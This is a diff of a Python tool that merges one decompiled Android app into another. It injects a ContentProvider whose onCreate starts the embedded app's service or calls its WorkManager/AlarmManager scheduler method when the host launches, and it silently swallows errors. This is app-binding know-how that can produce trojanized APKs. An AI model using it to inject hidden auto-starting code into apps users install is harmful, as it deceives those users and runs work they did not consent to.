@@ -96,9 +96,69 @@ def detect_scheduler(minor_dir):
     return None, found
 
 
-def _provider_smali(provider_class, service_class):
+def _oncreate_body(target):
+    """
+    Build the body of the provider's onCreate() for the chosen target.
+    `target` is either:
+      - a service FQCN  -> start that service (startForegroundService/startService)
+      - "call:<fqcn>:<method>:object"  -> invoke a Kotlin-object method(Context)
+      - "call:<fqcn>:<method>:static"  -> invoke a static method(Context)
+    In every case v0 holds the Context.
+    """
+    if target.startswith("call:"):
+        _, fqcn, method, kind = target.split(":", 3)
+        cls = "L" + fqcn.replace(".", "/") + ";"
+        if kind == "object":
+            invoke = (f"    sget-object v1, {cls}->INSTANCE:{cls}\n"
+                      f"    invoke-virtual {{v1, v0}}, {cls}->"
+                      f"{method}(Landroid/content/Context;)V")
+        else:
+            invoke = (f"    invoke-static {{v0}}, {cls}->"
+                      f"{method}(Landroid/content/Context;)V")
+        return (
+            "    invoke-virtual {p0}, Landroid/content/ContentProvider;->"
+            "getContext()Landroid/content/Context;\n"
+            "    move-result-object v0\n"
+            "    :try_start\n"
+            f"{invoke}\n"
+            "    :try_end\n"
+            "    .catch Ljava/lang/Throwable; {:try_start .. :try_end} :catch\n"
+            "    goto :ret\n"
+            "    :catch\n"
+            "    move-exception v1\n"
+            "    :ret")
+    # service target
+    svc = "L" + target.replace(".", "/") + ";"
+    return (
+        "    invoke-virtual {p0}, Landroid/content/ContentProvider;->"
+        "getContext()Landroid/content/Context;\n"
+        "    move-result-object v0\n"
+        "    new-instance v1, Landroid/content/Intent;\n"
+        f"    const-class v2, {svc}\n"
+        "    invoke-direct {v1, v0, v2}, Landroid/content/Intent;->"
+        "<init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
+        "    :try_start\n"
+        "    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I\n"
+        "    const/16 v3, 0x1a\n"
+        "    if-lt v2, v3, :pre_o\n"
+        "    invoke-virtual {v0, v1}, Landroid/content/Context;->"
+        "startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
+        "    goto :done\n"
+        "    :pre_o\n"
+        "    invoke-virtual {v0, v1}, Landroid/content/Context;->"
+        "startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
+        "    :done\n"
+        "    :try_end\n"
+        "    .catch Ljava/lang/Throwable; {:try_start .. :try_end} :catch\n"
+        "    goto :ret\n"
+        "    :catch\n"
+        "    move-exception v1\n"
+        "    :ret")
+
+
+def _provider_smali(provider_class, target):
     cls = "L" + provider_class.replace(".", "/") + ";"
-    svc = "L" + service_class.replace(".", "/") + ";"
+    body = _oncreate_body(target)
     return f""".class public {cls}
 .super Landroid/content/ContentProvider;
 
@@ -109,27 +169,8 @@ def _provider_smali(provider_class, service_class):
 .end method
 
 .method public onCreate()Z
-    .locals 3
-    invoke-virtual {{p0}}, Landroid/content/ContentProvider;->getContext()Landroid/content/Context;
-    move-result-object v0
-    new-instance v1, Landroid/content/Intent;
-    const-class v2, {svc}
-    invoke-direct {{v1, v0, v2}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-    :try_start
-    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I
-    const/16 p1, 0x1a
-    if-lt v2, p1, :pre_o
-    invoke-virtual {{v0, v1}}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
-    goto :done
-    :pre_o
-    invoke-virtual {{v0, v1}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
-    :done
-    :try_end
-    .catch Ljava/lang/Exception; {{:try_start .. :try_end}} :catch
-    goto :ret
-    :catch
-    move-exception v0
-    :ret
+    .locals 4
+{body}
     const/4 v0, 0x1
     return v0
 .end method
@@ -166,7 +207,83 @@ def _provider_smali(provider_class, service_class):
 """
 
 
-def merge(major_dir, minor_dir, service_class, log):
+_SCHED_WORDS = ("enable", "schedule", "start", "init", "setup",
+                "ensure", "begin", "register")
+_METHOD_RE = re.compile(
+    r"\.method\s+(?P<flags>[\w ]*?)\s*(?P<name>[\w$]+)"
+    r"\(Landroid/content/Context;\)V")
+
+
+def detect_bootstraps(minor_dir):
+    """
+    Find the minor app's OWN entry points that schedule background work — a
+    public method taking a single Context, on a class that talks to WorkManager/
+    AlarmManager/JobScheduler. These are what actually register the periodic job
+    (e.g. a Kotlin `object Scheduler { fun enable(Context) }`), as opposed to the
+    library's internal services. Returns a list of dicts ordered best-first:
+      {class, method, kind ('object'|'static'), token}
+    `token` is what to pass to merge() as the target.
+    """
+    root = ET.parse(os.path.join(minor_dir, "AndroidManifest.xml")).getroot()
+    pkg = _pkg(root)
+    if not pkg:
+        return []
+    pkg_path = pkg.replace(".", "/")
+    sched_markers = ("Landroidx/work/", "enqueue", "PeriodicWork",
+                     "Landroid/app/AlarmManager;", "Landroid/app/job/")
+    cands = []
+    for d in os.listdir(minor_dir):
+        if not d.startswith("smali"):
+            continue
+        base = os.path.join(minor_dir, d, pkg_path)
+        if not os.path.isdir(base):
+            continue
+        for croot, _, files in os.walk(base):
+            for f in files:
+                if not f.endswith(".smali"):
+                    continue
+                p = os.path.join(croot, f)
+                try:
+                    txt = open(p, encoding="utf-8", errors="ignore").read()
+                except OSError:
+                    continue
+                if not any(m in txt for m in sched_markers):
+                    continue
+                m = re.search(r"\.class[^\n]*?(L[\w/$]+;)", txt)
+                if not m:
+                    continue
+                cls = m.group(1)
+                fqcn = cls[1:-1].replace("/", ".")
+                is_object = f".field public static final INSTANCE:{cls}" in txt
+                for mm in _METHOD_RE.finditer(txt):
+                    flags = mm.group("flags")
+                    name = mm.group("name")
+                    if "public" not in flags or name in ("<init>",):
+                        continue
+                    static = "static" in flags
+                    if static:
+                        kind = "static"
+                    elif is_object:
+                        kind = "object"
+                    else:
+                        continue   # instance method with no singleton: can't call
+                    score = (0 if any(w in name.lower() for w in _SCHED_WORDS)
+                             else 1)
+                    cands.append((score, {
+                        "class": fqcn, "method": name, "kind": kind,
+                        "token": f"call:{fqcn}:{name}:{kind}",
+                        "label": f"{fqcn}.{name}()"}))
+    cands.sort(key=lambda c: c[0])
+    # de-dup by token, keep order
+    seen, out = set(), []
+    for _, c in cands:
+        if c["token"] not in seen:
+            seen.add(c["token"])
+            out.append(c)
+    return out
+
+
+def merge(major_dir, minor_dir, target, log):
     major_mf = os.path.join(major_dir, "AndroidManifest.xml")
     minor_mf = os.path.join(minor_dir, "AndroidManifest.xml")
     mtree = ET.parse(major_mf)
@@ -225,8 +342,12 @@ def merge(major_dir, minor_dir, service_class, log):
                            *provider_class.split(".")[:-1])
     os.makedirs(out_dir, exist_ok=True)
     with open(os.path.join(out_dir, "AutoStartProvider.smali"), "w") as fh:
-        fh.write(_provider_smali(provider_class, service_class))
-    log(f"[manifest] auto-start provider added, will start {service_class}")
+        fh.write(_provider_smali(provider_class, target))
+    if target.startswith("call:"):
+        _, fqcn, method, _kind = target.split(":", 3)
+        log(f"[manifest] auto-start provider added, will call {fqcn}.{method}()")
+    else:
+        log(f"[manifest] auto-start provider added, will start {target}")
 
     mtree.write(major_mf, encoding="utf-8", xml_declaration=True)
-    return service_class
+    return target
